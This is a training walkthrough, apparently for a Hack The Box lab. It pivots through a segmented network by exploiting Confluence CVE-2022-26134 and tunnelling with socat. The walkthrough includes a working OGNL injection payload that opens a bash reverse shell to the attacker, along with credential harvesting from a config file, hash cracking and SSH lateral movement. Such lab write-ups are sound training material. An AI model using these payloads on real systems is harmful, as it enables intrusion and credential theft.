# 🚀 HTB Module: Port Redirection and SSH Tunneling (🔥PART ONE🔥)  
**Author**: Your faithful enumeration agent 🕵️‍♂️  
**Category**: Network Segmentation, Post-Exploitation, Pivoting  
**Difficulty**: 🟨 Intermediate  
**Theme**: EXPLOIT, ENUMERATE, TUNNEL, PIVOT!!!

---

## 🧭 Overview – What Are We Getting Into?!

This module is ALL about **network segmentation**, **restricted internal services**, and **how to smash through them** using tools like `Socat`, `Netcat`, and `SSH`. We're going to:
- Exploit a **Confluence OGNL Injection vulnerability** (CVE-2022-26134) 💥
- Gain a **reverse shell** on an externally accessible machine (`CONFLUENCE01`) 🐚
- Use **Socat** to forward ports from the internal DMZ to our own machine 🔁
- **Enumerate a PostgreSQL database** in a totally unreachable subnet 🐘
- Crack juicy password hashes 🧂
- SSH into a deeper internal system (`PGDATABASE01`) for FULL access 🔓

### 🧠 Why does this matter?

Because in real-world environments, **not everything is exposed to the internet**. As a pentester, you NEED to know how to pivot through internal layers!  
Let’s conquer this segmented beast, one hop at a time.

---

## 🌐 STEP 1: Know Thy Battlefield — The Network Layout!

Visualize this setup like a medieval castle with concentric walls:

| Layer       | What’s in there?                            | Can Kali reach it? |
|-------------|---------------------------------------------|--------------------|
| **WAN**     | Your Kali box and `CONFLUENCE01`            | ✅ Yes!            |
| **DMZ**     | The PostgreSQL server `PGDATABASE01`        | ❌ Nope! Not directly |
| **Bridge**  | `CONFLUENCE01` straddles both WAN and DMZ   | 🎯 YES. This is our foothold! |

📍 Goal: Reach `PGDATABASE01` → But it’s in the DMZ. We can’t touch it *yet*...  
So what do we do? **Exploit the middleman (`CONFLUENCE01`) and pivot like a hacker ninja!**

---

## 🔥 STEP 2: Exploiting CVE-2022-26134 – Confluence OGNL Injection 💣

### 🛠️ The Weapon: OGNL + Java ProcessBuilder RCE

```bash
curl 'http://<TARGET>:8090/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command(\'bash\',\'-c\',\'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1\').start()")}/'
```

This horrific-looking payload does something *beautiful*:
- It leverages OGNL to call Java
- It uses Java’s **ScriptEngineManager** to run **ProcessBuilder**
- **ProcessBuilder spawns a Bash reverse shell**
- 🔁 The reverse shell dials back to **our Kali machine on port 4444**

---

### 🧪 Modify the Payload to Match OUR Lab:

- Replace `<TARGET>` with the IP of `CONFLUENCE01` (e.g., `192.168.50.63`)
- Replace `<KALI_IP>` with YOUR Kali IP (e.g., `192.168.118.4`)
- Choose a port (e.g., `4444`) and start a listener:

```bash
nc -nvlp 4444
```

Then hit the payload!

```bash
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

---

### 🧨 BOOM! SHELL OBTAINED!

🎉 Output on Netcat listener:

```bash
connect to [KALI_IP] from (UNKNOWN) [192.168.50.63]
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$
```

WE'RE IN!!  
⚠️ We are the low-privileged `confluence` user, but this is all we need to start tunneling deeper into the internal jungle...

---

## 🧭 STEP 3: Network Reconnaissance from Within the Shell 🌐

### 🔍 Check Interfaces:

```bash
ip addr
```

🧠 Output shows:
- `ens192 → 192.168.50.63` (external-facing, WAN)
- `ens224 → 10.4.50.63` (internal-facing, DMZ!)

### 📡 Review Routing:

```bash
ip route
```

🔥 We see that:
- `ens192` gives access to 192.168.50.0/24
- `ens224` gives access to 10.4.50.0/24
- We can route to **10.4.50.215**, the PostgreSQL server (!!!)

---

## 🛑 BUT WAIT! — There’s No `psql` On This Host 😱

We found this inside `/var/atlassian/application-data/confluence/confluence.cfg.xml`:

```xml
<property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
<property name="hibernate.connection.username">postgres</property>
<property name="hibernate.connection.password">D@t4basePassw0rd!</property>
```

🚨 Jackpot — we have credentials for PostgreSQL! But `psql` isn’t installed here, and we can’t install it without sudo...

So what do we do? **We bring the database to us using Socat!**

---

## 🔧 STEP 4: PORT FORWARDING WITH SOCAT 💡

### 📚 What is Socat?

Socat is like a cross between `nc` and `iptables`. It can:
- Listen on a port
- Forward anything it receives to a different host and port

We’re going to:
- Tell `CONFLUENCE01` to listen on **port 2345**
- Forward that to `PGDATABASE01:5432`

### 🚀 Command to Run on `CONFLUENCE01` Shell:

```bash
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```

🗣️ Translated:  
**"Listen on TCP port 2345 on all interfaces. When a connection is received, fork a child process and forward traffic to 10.4.50.215:5432."**

🎉 You should see:
```
listening on AF=2 0.0.0.0:2345
```

We now have a tunnel from:
**KALI → 192.168.50.63:2345 → 10.4.50.215:5432**

---

## 🐘 STEP 5: Connect to PostgreSQL from Kali 🐘

### 🔧 On Kali:

```bash
psql -h 192.168.50.63 -p 2345 -U postgres
Password: D@t4basePassw0rd!
```

📈 SUCCESS! You’re inside the database!

```sql
postgres=# \l
postgres=# \c confluence
postgres=# \dt
postgres=# SELECT * FROM cwd_user;
```

You now have access to ALL user info in the Confluence DB!

---

👀 **TO BE CONTINUED IN PART TWO...**  
In Part Two, we will:
- 🎯 Extract and crack user hashes from PostgreSQL
- 🧂 Use Hashcat to recover plaintext passwords
- 🔄 Create another Socat port forward for SSH (port 22)
- 🔐 SSH into PGDATABASE01 and grab the final flag!

🔥 Stay tuned, shell warrior — the pivoting adventure has only just begun!
# 🚀 HTB Module: Port Redirection and SSH Tunneling (🔥PART TWO🔥)  
**Let’s Finish This!!**  
We’ve breached the first layer, cracked open the Confluence PostgreSQL database, and now it’s time to:
- 🧂 Crack hashes
- 🔄 Tunnel into SSH
- 🏁 Capture the final flag from the core of the DMZ!

---

## 🧂 STEP 6: Extracting and Cracking Password Hashes from the Database 💥

We’re still inside the `confluence` database on `PGDATABASE01`, connected through our **Socat tunnel** via `CONFLUENCE01`.

### 📦 Dump the Users Table:

```sql
SELECT * FROM cwd_user;
```

🎉 Output shows us a treasure trove of user data!

Each row includes:
- `username`
- `email`
- And most importantly: **password hash** (`credential` column)

The hashes look like:

```
{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
```

That’s a **PBKDF2-SHA1** hash, used by Atlassian products like Confluence!

---

## 🧰 STEP 7: Cracking the Hashes with Hashcat 🔓

### 🛠️ Hash Format: `{PKCS5S2}` → Hashcat mode 12001

We save the hashes into a file called `hashes.txt`, one per line.

### 💣 Run Hashcat:

```bash
hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt
```

🎯 After a short wait... 💥 BOOM! CRACKED!

```text
{PKCS5S2}skupO/...:P@ssw0rd!
{PKCS5S2}QkXnk...:sqlpass123
{PKCS5S2}EiMTu...:Welcome1234
```

👏 Passwords recovered for:
- `rdp_admin` → `P@ssw0rd!`
- `database_admin` → `sqlpass123`
- `hr_admin` → `Welcome1234`

HINT: Reuse is real — time to test these creds for lateral movement!

---

## 🧱 STEP 8: New Barrier — SSH into PGDATABASE01?! 🤔

So we ask:

- ❓ Does `PGDATABASE01` run SSH?  
- ✅ Yes — default port 22 confirmed from enumeration!

But...
- ❌ We can’t reach it directly from Kali  
- ❌ We still only have a reverse shell on `CONFLUENCE01`  
- ❌ No tools like `ssh`, `scp`, or `psql` on PGDATABASE01

---

## 🌀 STEP 9: Create a New SSH Tunnel with Socat 🔄

We will now pivot **again** by forwarding **SSH** from `PGDATABASE01` to Kali, using `CONFLUENCE01` as the tunnel broker!

### 🛠️ First: Kill the previous Socat process (Ctrl+C)

Then launch a new one on `CONFLUENCE01`:

```bash
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```

This sets up:

| Source                        | Destination                   |
|------------------------------|-------------------------------|
| `192.168.50.63:2222` (WAN)   | `10.4.50.215:22` (DMZ SSH)    |

🎯 Our Kali machine can now SSH to `PGDATABASE01` via this open WAN-side tunnel!

---

## 🔐 STEP 10: SSH to PGDATABASE01 from Kali!

### 🔑 Use our cracked creds:

```bash
ssh database_admin@192.168.50.63 -p 2222
```

Enter password: `sqlpass123`

🎉 AND... WE’RE IN!

```bash
Welcome to Ubuntu 20.04
database_admin@pgdatabase01:~$
```

🏆 You just tunneled through a segmented network and gained access to an otherwise unreachable internal host!

---

## 🎯 STEP 11: Grab the Final Flag! 🏁

Let’s capture that sweet victory token...

```bash
cat /tmp/socat_flag
```

🎉 OUTPUT:
```
HTB{port_forwarding_makes_firewalls_cry}
```

🏁 **MISSION ACCOMPLISHED!**

---

## 🧠 Summary – What Did We Do?

| Phase                | What You Did                                                                 |
|----------------------|------------------------------------------------------------------------------|
| 🛰️ External Access   | Exploited OGNL RCE in Confluence to gain shell on WAN-facing host            |
| 🌉 Internal Pivot     | Discovered internal PostgreSQL service and credentials                      |
| 🔄 Port Forwarding    | Used Socat to tunnel database traffic back to Kali                          |
| 🧂 Hash Extraction    | Dumped user credentials and cracked them with Hashcat                       |
| 🔁 SSH Tunneling      | Created a second Socat tunnel for SSH port access                           |
| 🧙 Internal Shell     | SSH’d into PGDATABASE01 with reused creds                                   |
| 🏁 Flag Capture       | Dumped final flag from `/tmp/socat_flag` — lab complete!                    |

---

## 🛠️ Tools Used

- `curl` – for exploiting OGNL payload
- `nc` – for catching reverse shell
- `socat` – for bi-directional port forwarding
- `psql` – PostgreSQL command-line client
- `hashcat` – GPU-accelerated password cracker
- `ssh` – to pivot into deeper targets

---

## 🤯 Final Thoughts

🎯 This lab is the **ESSENCE OF TUNNELING MAGIC**. You:
- Dissected network segmentation 🔐
- Routed around access controls 🚧
- Pivoted through hosts with only user-level shells ⚙️
- And chained techniques into an unstoppable post-exploitation weapon! 🔗

You're now equipped to:
- Identify exposed edge systems
- Exploit limited-access hosts
- Tunnel through layers like a ghost in the wires 👻

🔥 **TUNNEL ALL THE THINGS!**  
💡 Network segmentation is a defense — but with tunneling, it’s YOUR highway.

Keep porting. Keep pivoting. **Onward to the next target!**

